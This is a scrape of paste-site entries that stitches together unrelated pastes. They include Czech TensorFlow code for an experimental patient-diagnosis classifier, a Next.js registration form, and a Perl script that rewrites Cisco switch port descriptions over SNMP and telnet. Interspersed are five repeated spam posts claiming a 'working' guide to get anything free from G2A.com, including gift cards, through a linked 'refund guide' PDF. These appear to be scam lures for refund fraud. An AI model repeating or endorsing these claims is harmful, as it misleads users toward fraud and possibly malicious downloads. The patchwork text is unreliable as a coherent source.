X_test, y_test = X, y

# Výpočet průměru a směrodatné odchylky pro každý sloupec
mu = np.mean(X_train, axis=0)
sigma = np.std(X_train, axis=0)

# Normalizace každého sloupce zvlášť
X_train_standardized = (X_train - mu) / sigma

# Normalizace testovacích dat
X_test_standardized = (X_test - mu) / sigma

# Definice modelu
model = tf.keras.Sequential([
    tf.keras.layers.Dense(256, activation='relu', input_shape=(X_train_standardized.shape[1],)),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(128, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

# Použití Adam optimizer s learning rate schedulerem
lr_schedule = tf.keras.optimizers.schedules.ExponentialDecay(
    initial_learning_rate=1e-3,
    decay_steps=10000,
    decay_rate=0.9
)
optimizer = tf.keras.optimizers.Adam(learning_rate=lr_schedule)

# Kompilace modelu
model.compile(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy', tf.keras.metrics.Recall()])

# Trénování modelu
history = model.fit(X_train_standardized, y_train, epochs=50, verbose=0, shuffle=False)

# Predikce
y_pred_prob = model.predict(X_test_standardized)
y_pred = (y_pred_prob > 0.5).astype(int)

# Výpočet metrik
recall = recall_score(y_test, y_pred)
conf_matrix = confusion_matrix(y_test, y_pred)

# Vyhodnocení výkonu modelu
accuracy = accuracy_score(y_test, y_pred)
precision = precision_score(y_test, y_pred)
f1 = f1_score(y_test, y_pred)

# Výpis metrik
print(f""Recall: {recall:.4f}"")
print(f""Accuracy: {accuracy:.4f}"")
print(f""Precision: {precision:.4f}"")
print(f""F1 Score: {f1:.4f}"")
print(f""Confusion Matrix:\n{conf_matrix}"")

# Zobrazení confusion matrix
sns.heatmap(conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('Confusion Matrix')
plt.show()

# Odstranění mezivýstupů
num_iterations = 500

best_row = None
best_prediction = None
best_diff = float('inf')

for _ in range(num_iterations):
    new_data = np.random.normal(mu, sigma)
    new_data_standardized = (new_data - mu) / sigma
    prediction_prob = model.predict(np.array([new_data_standardized]), verbose=0)[0][0]
    diff = abs(prediction_prob - 0.67)
    
    if diff < best_diff:
        best_diff = diff
        best_row = new_data
        best_prediction = prediction_prob

print(f""Nejlepší řádek: {best_row}"")
print(f""Predikovaná hodnota: {best_prediction}"")
print(f""Rozdíl: {best_diff}"")

# Vizualizace výsledků pomocí PCA
X_standardized = (X - mu) / sigma
pca = PCA(n_components=2)  # Snížení na 2 komponenty
X_pca = pca.fit_transform(X_standardized)

plt.figure()
plt.scatter(X_pca[:, 0], X_pca[:, 1], c=y)
plt.xlabel('První hlavní komponenta')
plt.ylabel('Druhá hlavní komponenta')
plt.title('PCA na vašich datech')
plt.show()

# Vizualizace výsledků pomocí LDA
lda = LDA(n_components=1)
X_lda = lda.fit_transform(X_standardized, y)

plt.figure()
plt.scatter(X_lda[:, 0], np.zeros_like(X_lda), c=y)
plt.xlabel('První diskriminační komponenta')
plt.title('LDA s učitelem')
plt.show()

# Vytvoření obrazu pro trénovací data
min_pixel_value = -3
max_pixel_value = 3

image_training = np.zeros((len(X_train_standardized), len(X_train_standardized[0]) + 1, 3), dtype=np.uint8)

for i, label in enumerate(y_train):
    for j in range(len(X_train_standardized[0])):
        pixel_value = int(np.interp(X_train_standardized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, j] = np.array([pixel_value] * 3)
    image_training[i, -1] = np.array([128, 128, 128])  # Šedý sloupec pro všechny řádky
    if label == 0:
        image_training[i, -1] = np.array([0, 128, 0])  # Zelený sloupec pro label 0
    elif label == 1:
        image_training[i, -1] = np.array([255, 0, 0])  # Červený sloupec pro label 1

# Zobrazení obrazu
plt.imshow(image_training)
plt.title(""Training Data"")
plt.axis(""off"")
plt.show()"
ieCWCwur,🎉G2A.com Free Gift Card Guide 2024 May🤑,Alfonso1119,Python,Tuesday 28th of May 2024 04:41:36 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_4944119.pdf

Working as of:

29 May 2024"
DGAbZq3C,🎉G2A.com Free Gift Card Guide 2024 May🚀,Garoam,Python,Tuesday 28th of May 2024 04:34:52 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_4944119.pdf

Working as of:

29 May 2024"
wbdB9XXu,Complete Register,danielvitor23,TypeScript,Tuesday 28th of May 2024 04:31:48 PM CDT,"""use client"";
import { zodResolver } from ""@hookform/resolvers/zod"";
import { useRouter } from ""next/navigation"";
import { Controller, SubmitHandler, useForm } from ""react-hook-form"";
import { z } from ""zod"";

import { Button } from ""@/components/Button"";
import { DayOfWeekPicker } from ""@/components/DaysOfWeekPicker"";
import Input from ""@/components/Input"";
import { InputImage } from ""@/components/InputImage"";
import { LabelError } from ""@/components/LabelError"";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from ""@/components/Select/Select"";
import TimePicker from ""@/components/TimePicker"";
import { useEffect } from ""react"";

const registerSchema = z.object({
  name: z.string().min(2, { message: ""Nome deve ter ao menos 2 caracteres."" }),
  selectedRole: z.string().min(1, { message: ""Selecione uma profissão"" }),
  image: z.string().min(1, { message: ""Adicione uma imagem!"" }),
  workingDays: z.array(
    z.coerce.boolean(),
  ).refine(arg => {
    const quantity = arg.reduce((prev, curr) => prev + (curr === true ? 1 : 0), 0)
    return quantity > 0;
  }, { message: 'Deve ter no mínimo 1 dia.' }),
  workingHour: z.tuple([z.date(), z.date()]),
});

type RegisterType = z.infer<typeof registerSchema>;

export default function CompleteRegister() {
  const router = useRouter();

  const {
    control,
    handleSubmit,
    register,
    formState: { errors },
  } = useForm<RegisterType>({
    resolver: zodResolver(registerSchema),
  });

  const onSubmit: SubmitHandler<RegisterType> = async (data) => {
    try {
      console.log(data);
      router.push(""/app"");
    } catch (error) {
      console.error(error);
    }
  };

  useEffect(() => {
    console.log(errors.image);
    console.log(errors.name);
    console.log(errors.selectedRole);
    console.log(errors.workingDays);
    console.log(errors.workingHour);
  }, [errors]);

  return (
    <form
      onSubmit={handleSubmit(onSubmit)}
      className=""grid grid-rows-[30px_1fr_1fr_50px] w-full h-full gap-12 sm:gap-6 min-[200px]:max-[700px]:gap-5""
    >
      <h1 className=""text-2xl font-semibold tracking-wider text-handle-blue text-center min-[200px]:max-[700px]:-mt-4"">
        Nos conte sobre sua vida profissional :)
      </h1>
      <div className=""md:grid md:grid-cols-[1fr_2fr] sm:flex sm:flex-col sm:items-center gap-6"">
        <div className=""flex flex-col items-center"">
          <Controller
            control={control}
            name=""image""
            render={({ field }) => <InputImage {...field} />}
          />
        </div>
        <div className=""flex flex-col justify-evenly gap-[38px] w-full min-[200px]:mt-6 min-[200px]:max-[700px]:w-full items-center min-[200px]:max-[700px]:gap-3"">
          <div className=""w-full flex flex-col gap-1"">
            <Input
              {...register(""name"")}
              error={!!errors.name}
              placeholder=""Nome""
              customBgColor=""bg-handle-background""
              sz=""large""
              className=""w-full""
            />

            <LabelError errors={errors} name=""name"" />
          </div>

          <div className=""w-full flex flex-col gap-1"">
            <Controller
              control={control}
              name=""selectedRole""
              render={({ field }) => (
                <Select {...field} onValueChange={(val) => field.onChange(val)}>
                  <SelectTrigger className=""bg-transparent h-16"">
                    <SelectValue placeholder={""Selecione sua profissão""} />
                  </SelectTrigger>
                  <SelectContent>
                    {[
                      ""Desenvolvedor"",
                      ""Designer"",
                      ""Engenheiro"",
                      ""Estudante"",
                      ""Outro"",
                    ].map((item) => {
                      return (
                        <SelectItem
                          className=""bg-transparent""
                          key={item}
                          value={item}
                        >
                          {item}
                        </SelectItem>
                      );
                    })}
                  </SelectContent>
                </Select>
              )}
            />

            <LabelError errors={errors} name=""selectedRole"" />
          </div>
        </div>
      </div>
      <div className=""border-[0.098rem] border-handle-gray-700 w-full h-full rounded-sm"">
        <label className=""absolute text-sm tracking-widest -mt-[15px] bg-handle-background ml-2 p-1"">
          Meu expediente
        </label>
        <div className=""flex flex-col items-center  w-full h-full justify-center min-[200px]:py-4 min-[200px]:px-1"">
          <div>
            <label htmlFor="""" className=""self-start mb-[7px] mt-[7px]"">
              Selecione os dias que você trabalha :)
            </label>
            <Controller
              control={control}
              name=""workingDays""
              render={({ field: { ref, value, onChange } }) => (
                <DayOfWeekPicker
                  ref={ref}
                  className=""h-full gap-[21.59px] min-[200px]:max-[500px]:gap-1 mb-[25px] w-full""
                />
              )}
            />
          </div>
          <TimePicker
            {...register(""workingHour"")}
            className={""gap[95px] w-full""}
          />
        </div>
      </div>
      <div className=""flex flex-col justify-center items-center"">
        <Button
          type=""submit""
          size=""large""
          variant={""primary""}
          className=""text-lg""
        >
          Finalizar
        </Button>
      </div>
    </form>
  );
}
"
mLVvvNif,🤑G2A.com Free Gift Card Guide 2024 May💰,atakan1983,Python,Tuesday 28th of May 2024 04:28:08 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_4944119.pdf

Working as of:

29 May 2024"
Wtfhbk7K,CDP N to description,poodad,Perl,Tuesday 28th of May 2024 04:22:02 PM CDT,"use strict;
use Net::SNMP;
use CGI qw/:standard/;
use CGI::Carp qw(fatalsToBrowser);
use Net::Telnet::Cisco;
use DBI;
use Win32::TieRegistry( Delimiter=>""/"", ""KEY_READ"" );
use Data::Dumper;

print ""Content-type: text/html\n\n"";

my $userid = remote_user();
$userid = '' unless defined $userid;
$userid =~ s/..*\\//;
$userid = lc($userid);
my $password = $ENV{AUTH_PASSWORD};

if ( param('switch') and param('text') ){
    step3();
} elsif (param('switch') ) {
	step2();
} else {
    step1();
}

exit 0;

###############################################################################
#
# Draw the initial form 
#
###############################################################################

sub step1 {


    my %netinv;
    LoadNetInventory(\%netinv);

	my @switches = grep /^[A-Z]+[1-9][A-Z]S[0-9][0-9]$/i, keys %netinv;

    print start_form;
	print ""<p>Pick the switch: \n"";

	print ""<select name=switch>\n"";
	foreach my $switch (sort @switches) {
		$switch = uc $switch;
		print ""<option value=\""$switch\"">$switch\n"";
	}
	print ""</select>\n"";
	print '<p><input type=submit value=""Next"" name=button>';
	print end_form;    
}

###############################################################################
#
#
###############################################################################

sub step2 {

    my $switch = uc param('switch');

	my $obj = new switch($switch);
	
	die ""Could not create switch object for $switch\n"" unless $obj;
	
    print ""<h3>Switch: $switch</h3><p>\n"";
    
	my @ports = $obj->LoadPorts();
	
	my %portchannel;

    my @lines;

	foreach my $ifIndex ( sort @ports ) {
		my $port = $obj->GetPort($ifIndex);
	
		next if $port->name() =~ /^vl/i;			# skip vlans
		
		my $old_desc = $port->desc();
        my $tmp = $old_desc;
		my $new_desc = $old_desc;
        
        my $jack = """";
        if ( $tmp =~ /^([1-9][A-Z][0-9][0-9])/) {                    # Core switches have jack numbers - don't lose it
            $jack = $1;
        }
        
		$new_desc = '' if $new_desc =~ /uplink.+e[0-9][0-9]/i;			# If old description looks like ""Uplink to E54SJ01"", it is no longer valid 

		my $cdpn = $port->cdpn();
		$cdpn =~ s/\..+//g;												# Get rid of domain name
		$cdpn =~ s/\(..*\)//;
        
        
		if ($cdpn) {
			$new_desc = '';
			$new_desc .= ' ' if $new_desc;
			$new_desc .= ""$jack $cdpn"";
			if ( $port->pagp() ) {
				my $name = $obj->GetPort( $port->pagp() )->name();
				$portchannel{$port->pagp()} = $new_desc if $port->pagp(); 
				$new_desc .= "" (via $name)"";
			} else {
                #$new_desc .= "" "" . $port->cdpnport();
            }
            
            $new_desc .= "" "" . $port->cdpnport() if $cdpn =~ /^vh/i;        # Add the port name if ESX server
            
		}

		$new_desc =~ s/^ //;
        
		if ($new_desc ne $old_desc) {
			push @lines, ""int "" . $port->name();
			push @lines, ""! old description: $old_desc"";
			if ($new_desc) {
				push @lines, "" description $new_desc"";
			} else {
				push @lines, "" no description"";
			}
            push @lines, ""!"";
		}
	}
	
	foreach my $ifIndex ( keys %portchannel ) {
		next unless $portchannel{$ifIndex};
		push @lines, ""interface "" . $obj->GetPort($ifIndex)->name();
		push @lines, "" description $portchannel{$ifIndex}"";
        push @lines, ""!"";
	}

    my $lc = scalar @lines;

    print start_form;

	print qq(<p><textarea autofocus=""autofocus"" name=""text"" wrap=""hard"" rows=""$lc"" cols=""80"">\n);
    print join ""\n"", @lines;
    print qq(</textarea>\n);
	print qq(<input type=hidden name=""switch"" value=""$switch"">\n);

	print '<p><input type=submit value=""Apply Changes"" name=button>';
	print end_form;

}	

    

###############################################################################
#
# Use telnet to send the IOS commands to implelemnt the desired changes
#
###############################################################################

sub step3 {

    my $switch = param('switch');
    my $text = param('text');
	my $logfile = ""c:/temp/cdpn_desc-$switch.log"";
    my $session = Net::Telnet::Cisco->new(Host => $switch, errmode => ""return"", Input_log=>$logfile);

    my $res = $session->login($userid, $password);
	if( ! $res ) {
		print ""<font size=+2 color=red>ERROR: Logon failed for switch</font>\n"";
		DumpLog($logfile);
		return;
	}
	
    $res = $session->enable(Nunya(2));
	if( ! $res ) {
		print ""<font size=+2 color=red>ERROR: enable failed for switch</font>\n"";
		$session->Close();
		DumpLog($logfile);
		return;
	}

	# send commands

    my @lines = split /[\n\r]+/, $text;

   	$session->cmd('config t');
    
    foreach my $line (@lines) {
        $line =~ s/^ +//;
        if( $line =~ /^int/ or $line =~ /^description/ or $line =~ /^no description/) {
            $session->cmd($line);
        }
    }

	$session->cmd(""exit"");		# exit ""interface ...""
	$session->cmd(""exit"");		# exit ""config t""
	
	$session->cmd(""copy run start\n"");

	# Show the user a transcript of the communication with the router.
	DumpLog($logfile);
}

###############################################################################
# Dump the log file to the user
###############################################################################

sub DumpLog {
	my $file = shift;
	
	open FILE, $file or die ""$file: $!\n"";
	
	print ""<b>Transcript of session with switch</b><p><pre>"";
	
	while(<FILE>){
		chomp;
		next if /^username/i;
		print ""$_\n"";
	}
	
	print ""</pre>\n"";
	close FILE;
}



sub LoadNetInventory {

}



################################################################################
#
# Switch object
#
################################################################################

package switch;

sub new {
	my $class = shift;
    my $name = shift;
	my $self  = {};

	bless ($self, $class);
    
    $self->{name} = $name;
    $self->{vlans} = {};            # hash of VLAN objects indexed by VLAN number                
    $self->{ports} = {};            # hash of port obects indexed by ifindex number
    $self->{arp} = {};              # arp cache

   
    # Open SNMP connection. Don't translate octet strings - Net::SNMP doesn't always get it right - we'll do it ourself

    my $community = ""public"";
    my $timeout = 60;
    
    ($self->{snmp}, my $err) = Net::SNMP->session( -hostname => $name, -version => '2c', -community => $community, -timeout  => $timeout, -port => ""161"", -translate=>[-octetstring => 0]);

    if ( !defined($self->{snmp}) ) {
        print STDERR ""$name: SNMP open error: $err\n"";
        return undef;
    }

    return $self;
}

sub LoadPorts {                     # Grab ports, create port objects, populate, and index by ifindex
    my $self = shift;

    # get the port names
 
    my $res = util::tablehash($self->{snmp}, ""1.3.6.1.2.1.31.1.1.1.1"", 1);     # ifName

    foreach my $ifindex ( keys %{$res} ) {                                     # entries will look like '234' => 'Gi6/39'
        my $ifname = $res->{$ifindex};
        $self->{ports}{$ifindex} = port->new($ifname);
    }

    # port descriptions

    $res = util::tablehash($self->{snmp}, ""1.3.6.1.2.1.31.1.1.1.18"", 1);       # ifAlias

    foreach my $ifindex ( keys %{$res} ) {                                     # entries will look like '236' => 'Uplink to E54APG06'
        my $desc = $res->{$ifindex};
        $self->{ports}->{$ifindex}->desc($desc);
    }
   
    # port mode (trunk or access)

    $res = util::tablehash($self->{snmp}, ""1.3.6.1.4.1.9.9.46.1.6.1.1.14"", 1);     # vlanTrunkPortDynamicStatus 

    foreach my $ifindex ( keys %{$res} ) {
        my $mode = $res->{$ifindex};
        $self->{ports}->{$ifindex}->mode('Access') if $mode == 2;
        $self->{ports}->{$ifindex}->mode('Trunk') if $mode == 1;
    }

	# get port status
	# ( 1=>'up', 2=>'down', 3=>'testing', 4=>'unknown', 5=>'dormant', 6=>'notPresent', 7=>'lowerLayerDown');

	
	$res = util::tablehash($self->{snmp}, ""1.3.6.1.2.1.2.2.1.8"", 1);     

    foreach my $ifindex ( keys %{$res} ) {
        my $mode = $res->{$ifindex};
        $self->{ports}->{$ifindex}->status('up') if $mode == 1;
        $self->{ports}->{$ifindex}->status('down') if $mode == 2;
		$self->{ports}->{$ifindex}->status('testing') if $mode == 3;
		$self->{ports}->{$ifindex}->status('unknown') if $mode == 4;
		$self->{ports}->{$ifindex}->status('dormant') if $mode == 5;
		$self->{ports}->{$ifindex}->status('notPresent') if $mode == 6;
		$self->{ports}->{$ifindex}->status('lowerLayerDown') if $mode == 7;
    }
	
	# CDP neighbor	
	
    $res = util::tablehash($self->{snmp}, ""1.3.6.1.4.1.9.9.23.1.2.1.1.6"", 2);
	
	foreach my $x ( keys %{$res} ) {
		my ($ifIndex, $junk) = split /\./, $x;
		$self->{ports}->{$ifIndex}->cdpn($res->{$x});
	}

	# CDP neighbor port
	
    $res = util::tablehash($self->{snmp}, ""1.3.6.1.4.1.9.9.23.1.2.1.1.7"", 2);
	
	foreach my $x ( keys %{$res} ) {
		my ($ifIndex, $junk) = split /\./, $x;
		$self->{ports}->{$ifIndex}->cdpnport($res->{$x});
	}

	# Get corresponding VLANs
	
    $res = util::tablehash($self->{snmp}, ""1.3.6.1.4.1.9.9.68.1.2.2.1.2"", 1);

    foreach my $ifindex ( keys %{$res} ) {                                     
        my $vlan = $res->{$ifindex};
        $self->{ports}->{$ifindex}->vlan($vlan);
    }

	# Get any PAGP ports that this port is a member of
	
    $res = util::tablehash($self->{snmp}, ""1.3.6.1.4.1.9.9.98.1.1.1.1.8"", 1);

    foreach my $ifindex ( keys %{$res} ) {                                     
        my $po = $res->{$ifindex};
        $self->{ports}->{$ifindex}->pagp($po) unless $po == $ifindex;		# the ifindex of the port channel this interface is a member of
    }
	

    return keys %{$self->{ports}};
}


sub LoadArpCache {
    my $self = shift;
    
    my $res = util::tablehash($self->{snmp}, ""1.3.6.1.2.1.3.1.1.2"", 4);

    foreach my $ip ( keys %{$res} ) {                                     # entries will look like '1.2.3.4' => '00112233445566'
        my $mac = $res->{$ip};
        $self->{arp}{$ip} = $mac;
    }
    
    foreach my $i (keys %{$self->{arp}}) {
        $self->{arp}->{$i} = unpack ""H*"", $self->{arp}->{$i};
    }
    
    return keys %{$self->{arp}};
}


sub ArpEntry {
    my $self = shift;
    my $ip = shift;
    
    return $self->{arp}->{$ip} if exists $self->{arp}->{$ip};
    return undef;
    
}


sub GetPort {                   # Given an ifindex value, return port object 
    my $self = shift;
    my $p = shift;
    
    if( ! $self->{ports}->{$p} ) {              # No port exists for this ifindex?
        $self->{ports}->{$p} = port->new($p);   # create one - use the ifindex as the name   
    }
    
    return $self->{ports}->{$p};
}

sub GetVlan {                   # Given a VLAN number, return VLAN object
    my $self = shift;
    my $p = shift;
    
    return $self->{vlans}->{$p};
}

sub LoadVlans {                 # Get a list of VLANs, create VLAN objects, populate, index by VLAN number
    my $self = shift;
    
    # Get a list of the VLANs present on this switch and create a VLAN object
    
    my $res = util::tablehash($self->{snmp}, ""1.3.6.1.4.1.9.9.46.1.3.1.1.2"", 1); # vtpVlanState
    foreach my $vlan ( keys %{$res} ) {
        next unless $res->{$vlan};                                            # VLAN is not operational
        $self->{vlans}->{$vlan} = vlan->new(($self->{name}, $vlan));          # Create a VLAN object
    }
      
    # get VLAN descriptions
    
    $res = util::tablehash($self->{snmp}, ""1.3.6.1.4.1.9.9.46.1.3.1.1.4.1"", 1);    # vtpVlanName
    foreach my $vlan ( keys %{$res} ) {                                            # entries will look like  '3' => '85175_wire_room_E'
        $self->{vlans}->{$vlan}->desc($res->{$vlan});
    }    
    
    return keys %{$self->{vlans}};
}

package vlan;

sub new {
	my $class = shift;
    my $switch = shift;
    my $vlan = shift;

	my $self  = {};

	bless ($self, $class);
    
    $self->{vlan} = $vlan;
    $self->{switch} = $switch;

    $self->{bpindex} = undef;        # ifindex indexed by bridge port number
    $self->{macindex} = undef;       # MAC addresses indexed by mac index
    $self->{desc} = '';              # description
    $self->{cam} = {};               # CAM table - ifIndexes indexed by MAC address
    
    # Open SNMP connection. Don't translate octet strings - Net::SNMP doesn't always get it right - we'll do it ourself
    
    my $community = ""public"";
    my $timeout = 5;
    
    ($self->{snmp}, my $err) = Net::SNMP->session( -hostname => $switch, -version => '2c', -community => $community . '@' . $vlan, -timeout  => $timeout, -port => ""161"", -translate=>[-octetstring => 0]);

    if (!defined($self->{snmp})) {
        print STDERR ""swtich $switch VLAN $vlan SNMP open error: $err\n"";
        return undef;
    }

	return $self;
}

sub LoadCam {                       # Grab the CAM table, translate bridge ports to ifindex, and translate MAC indexes to MAC addresses
    my $self = shift;

    $self->{bpindex} = util::tablehash($self->{snmp}, ""1.3.6.1.2.1.17.1.4.1.2"", 1);        # dot1dBasePortIfIndex bridgeport to ifindex xref

    $self->{macindex} = util::tablehash($self->{snmp}, ""1.3.6.1.2.1.17.4.3.1.1"", 6);       # dot1dTpFdbAddress  MAC index to MAC

    # MAC addresses in this table are in binary because we told Net::SNMP not to translate. Translate them now

    foreach my $i (keys %{$self->{macindex}}) {
        $self->{macindex}->{$i} = unpack ""H*"", $self->{macindex}->{$i};
    }

    # Grab the CAM table for this VLAN

    my $res = util::tablehash($self->{snmp}, ""1.3.6.1.2.1.17.4.3.1.2"", 6);     # dot1dTpFdbPort
    foreach my $macindex ( keys %{$res} ) {
        if( ! $self->{macindex}->{$macindex} ) {            # No entry for this MAC index 
            my @tmp = split /\./, $macindex;                # Build a MAC address
            $self->{macindex}->{$macindex} = join """", @tmp; # save it
        }

        my $mac = $self->{macindex}->{$macindex};
        my $bp = $res->{$macindex};
        
        if( ! $self->{bpindex}->{$bp} ) {                   # No ifindex exists for this bridgeport - this happens when a MAC address is learned via the ARP table, or some other way
             $self->{bpindex}->{$bp} = '(other)';           # build it
        }        
        
        my $ifindex = $self->{bpindex}->{$bp};
        $self->{cam}->{$mac} = $ifindex;
    }

    return keys %{$self->{cam}};
}

sub GetCam {                        # Given a MAC address, return the ifindex for the port it was learned on
    my $self = shift;
    my $p = shift;
    return $self->{cam}->{$p};
}

sub desc {                          # for a given VLAN number, return the description
    my $self = shift;
    my $p = shift;
    
    $self->{desc} = $p if defined $p;
    return $self->{desc};
}

package port;

sub new {
    my $class = shift;
    my $name = shift;

    my $self = {};
    
    bless ($self, $class);

    $self->{name} = $name;
    $self->{desc} = '';
    $self->{mode} = '';
	$self->{cdpn} = '';
	$self->{status} = '';
	$self->{vlan} = '';
	$self->{pagp} = '';
    
    return $self;
}

sub pagp {
    my $self = shift;
    my $p = shift;
    
    $self->{pagp} = $p if defined $p;
    return $self->{pagp};
}

sub status {
    my $self = shift;
    my $p = shift;
    
    $self->{status} = $p if defined $p;
    return $self->{status};
}


sub cdpn {
    my $self = shift;
    my $p = shift;
    
    $self->{cdpn} = $p if defined $p;
    return $self->{cdpn};
}

sub cdpnport {
    my $self = shift;
    my $p = shift;
    
    $self->{cdpnport} = $p if defined $p;
    return $self->{cdpnport};
}

sub vlan {
    my $self = shift;
    my $p = shift;
    
    $self->{vlan} = $p if defined $p;
    return $self->{vlan};
}

sub mode {
    my $self = shift;
    my $p = shift;
    
    $self->{mode} = $p if defined $p;
    return $self->{mode};
}


sub desc {
    my $self = shift;
    my $p = shift;
    
    $self->{desc} = $p if defined $p;
    return $self->{desc};
}

sub name {
    my $self = shift;
    my $p = shift;
    
    $self->{name} = $p if defined $p;
    return $self->{name};
}


package util;

################################################################################
#
# Build a hash from an SNMP table. The key is created by taking the last $n
# elements of the returned OID value.
#
################################################################################

sub tablehash {
    my $snmp = shift;
    my $oid = shift;
    my $n = shift;
    
    my $ret = ();
    
    my $res = $snmp->get_table(-baseoid => $oid, -maxrepetitions  => 30);
    
    foreach my $x ( keys %{$res} ) {
        my @tmp = split /\./, $x;
        my $key = join ""."", splice(@tmp, -1 * $n);
        $ret->{$key} = $res->{$x};
    }
    
    return $ret;
}"
UeCP8Fr2,💸G2A.com Free Gift Card Guide 2024 May🔥,lookos13,Python,Tuesday 28th of May 2024 04:21:23 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_4944119.pdf

Working as of:

29 May 2024"
zv5HnYH5,💰G2A.com Free Gift Card Guide 2024 May🚀,pestinha,Python,Tuesday 28th of May 2024 04:14:38 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_4944119.pdf

Working as of:

29 May 2024"
F6BSWTGd,Untitled,jargon,JavaScript,Tuesday 28th of May 2024 03:46:16 PM CDT,"		// Prepare attributes list

		this.list = [];

		// Load attributes list
		
		this.attributes.forEach(attribute => {
			this.list[this[attribute]] = this.loadJSON(`http://${this.host}/maps/attributes/${attribute}.json`);
		});
"
yqYkWdWq,problemy s normalizaci jinak OK,max2201111,Python,Tuesday 28th of May 2024 03:43:32 PM CDT,"#Navod na pouziti, Mgr. Hynek Mlčoušek, v Brne 2.5.2024
#Ulozte do lokalniho souboru u sebe na PC data tohoto tvaru vzdy ukoncene 0 ci 1 (jde o uceni s ucitelem: 1 = nemocny, 0 = prezil/zdravy, ve vystupu bude zelena znacit 0, cervena 1)  a bez znaku #; pozor na "",""

# [ [23.657800719276743,18.859916797201468,0],
# [22.573729142097473,17.96922325097786,0],
# [32.55342396968757,29.463651408558803,0],
# [6.718035041529263,25.704665468161718,1],
# [14.401918566243225,16.770856492924658,0],
# [17.457907312962234,21.76521470574044,0],
# [20.02796946568093,73.45445954770891,1],
# [30.295138369778076,62.901112886193246,1],
# [15.128977804449633,32.40267702110393,0],
# [30.179457395820013,58.982492125646104,1],
# [28.01649701854089,63.92781357637711,1],
# [16.791838457871147,42.33482314089884,0],
# [10.583694293380976,19.61926728942497,0],
# [26.634447074406467,91.96624817360987,1],
# [26.217868623367643,36.400293587062976,0],
# [17.689396788624936,60.79797114006423,1],
# [33.17193822527976,66.75277364959176,1],
# [23.793952755709153,22.57501437360518,0]]

#kliknete na cerne tlacitko s trojuhelnickem vlevo nahore
#pod kodem se objevi moznost spustit dialogove okenko, kliknete na nej
#soubor, ktery mate z bodu vyse vyberte a nahrajte
#Najdete v tomto kodu retezec:
###ZDE VLOZTE DATA OD NOVYCH PACIENTU

#Vlozte do pole
# new_persons_results = []
# data o nekolika malo novych pacientech bez ukoncovaci 0 a 1, ale se stejnym poctem sloupcu jako ma soubor z Vaseho lokalniho disku, vyse by tedy toto bylo rovno 2
#kod vyhodi hned po natrenovani, (jehoz prubeh muzete sledovat na modre progres bare) pro kazdy radek z new_persons_results bilo-sedo-cerne ctverecky vznikle z normalizace poskytnutych dat a ukoncovaci ctverecek cerveny pripadne zeleny
#zaroven s tim se vypise realne cislo mezi 0 a 1 znacici jak moc je pacient zdravy (blizke 0) ci nemocny (blizke 1)
#cisla uprostred pak indikuji zadany oranzovy semafor.
#je na lekarich nastavit tresholdy (tedy pravdepodobnosti: cisla mezi 0 a 1) ktere pak daji zaver, zda je pacient cerveny, oranzovy ci zeleny

# prosim o komnetare a vysledky na realnych datech, je zadouci aby radku v matici, tedy pacientu byly stovky a sloupcu desitky
# Moznosti vyuziti: onkologicka diagnoza vs. zdrava kontorlni skupina, diabetes (pritomnost/nepritomnost), testovani noveho leku oproti placebu atd.

#kod zaroven vyhodi confusion matici, tedy mozne True Negative a False Positive plus spravne zarazene hodnoty spolu s presnosti,F1 score recall atd.
#poznamka ke kodu: jde o epxerimentalni verzi, ktera krome skutecne potrebneho kodu obsahuje ladici informace, ruzne duplicity, nadbytecne prikazy atd.
# Na uvod behu programu se pro kontorlu vypise poskytnuta matice a jeji normalizovana verze, je treba sjet jezdcem napravo nize na obrazky a dalsi vystupy

#Dekuji profesoru Petru Dostalovi za namet k teto praci a poskytnuta data, byt je potreba mit data realna

import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from tqdm import tqdm


from IPython.display import display
from IPython.display import Javascript
display(Javascript('IPython.OutputArea.auto_scroll_threshold = 9999;'))

label_colors = {0: [0, 128, 0], 1: [255, 0, 0]}
label_colors_testing = {0: [0, 128, 0], 1: [255, 0, 0]}


%matplotlib inline



# Function to create images based on predictions
def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Create a gradient based on the normalized values
        gradient_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
        image[i, -1] = np.array([gradient_value] * 3)

    return image

def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

